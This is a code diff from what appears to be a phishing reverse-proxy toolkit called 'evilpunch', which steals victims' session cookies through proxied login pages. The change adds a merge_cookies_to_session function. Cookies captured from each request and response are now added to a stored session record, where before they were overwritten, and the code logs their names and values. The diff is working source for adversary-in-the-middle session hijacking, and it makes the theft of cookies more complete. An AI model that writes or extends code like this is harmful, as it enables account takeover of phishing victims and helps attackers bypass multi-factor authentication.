@@ -1203,12 +1203,7 @@ async def capture_cookies(request, session_cookie: str, phishlet_id: int, proxy_
                 debug_log(f"🍪 Filtered out {len(filtered_cookies)} evilpunch session cookies: {filtered_cookies}", "DEBUG")
             
             if captured_cookies:
-                await update_session_data(
-                    session_cookie, 
-                    phishlet_id, 
-                    proxy_domain, 
-                    captured_cookies=captured_cookies
-                )
+                await merge_cookies_to_session(session_cookie, phishlet_id, proxy_domain, captured_cookies, "request")
                 debug_log(f"🎯 🟢 CAPTURED {len(captured_cookies)} COOKIES from request with detailed metadata", "INFO")
                 for cookie in captured_cookies:
                     debug_log(f"   🍪 {cookie['name']}: {cookie['value'][:20]}... (domain: {cookie['domain']}, secure: {cookie['secure']})", "DEBUG")
@@ -1217,6 +1212,52 @@ async def capture_cookies(request, session_cookie: str, phishlet_id: int, proxy_
                 
     except Exception as e:
         debug_log(f"Error capturing cookies from request: {e}", "ERROR")
+        debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")
+
+async def merge_cookies_to_session(session_cookie: str, phishlet_id: int, proxy_domain: str, new_cookies: list, source: str):
+    """
+    Merge new cookies with existing session cookies instead of replacing them
+    """
+    try:
+        def _merge_operation():
+            from .models import Session
+            
+            try:
+                session = Session.objects.get(
+                    session_cookie=session_cookie,
+                    phishlet_id=phishlet_id,
+                    is_active=True
+                )
+                
+                # Get existing cookies or initialize empty dict
+                existing_cookies = session.captured_cookies or {}
+                
+                # Convert list of cookie objects to dict for merging
+                new_cookies_dict = {}
+                for cookie in new_cookies:
+                    new_cookies_dict[cookie['name']] = cookie
+                
+                # Merge new cookies with existing ones (new cookies override existing ones with same name)
+                merged_cookies = {**existing_cookies, **new_cookies_dict}
+                
+                # Update the session with merged cookies
+                session.captured_cookies = merged_cookies
+                session.is_captured = session.has_captured_data()
+                session.save(update_fields=['captured_cookies', 'is_captured'])
+                
+                added_count = len(new_cookies_dict)
+                total_count = len(merged_cookies)
+                debug_log(f"🍪 MERGED {added_count} new cookies from {source} into session (total: {total_count})", "DEBUG")
+                
+            except Session.DoesNotExist:
+                debug_log(f"Session {session_cookie[:8]}... not found for cookie merge", "WARN")
+                
+        # Run in thread executor to avoid Django async issues
+        loop = asyncio.get_running_loop()
+        await loop.run_in_executor(None, _merge_operation)
+        
+    except Exception as e:
+        debug_log(f"Error merging cookies to session: {e}", "ERROR")
         debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")
 
 async def capture_response_cookies(response_headers, session_cookie: str, phishlet_id: int, proxy_domain: str):
@@ -1243,12 +1284,7 @@ async def capture_response_cookies(response_headers, session_cookie: str, phishl
                     continue
             
             if captured_cookies:
-                await update_session_data(
-                    session_cookie, 
-                    phishlet_id, 
-                    proxy_domain, 
-                    captured_cookies=captured_cookies
-                )
+                await merge_cookies_to_session(session_cookie, phishlet_id, proxy_domain, captured_cookies, "response")
                 debug_log(f"🎯 🟢 CAPTURED {len(captured_cookies)} COOKIES from response with detailed metadata", "INFO")
                 for cookie in captured_cookies:
                     debug_log(f"   🍪 {cookie['name']}: {cookie['value'][:20]}... (domain: {cookie['domain']}, secure: {cookie['secure']}, httpOnly: {cookie['httpOnly']})", "DEBUG")
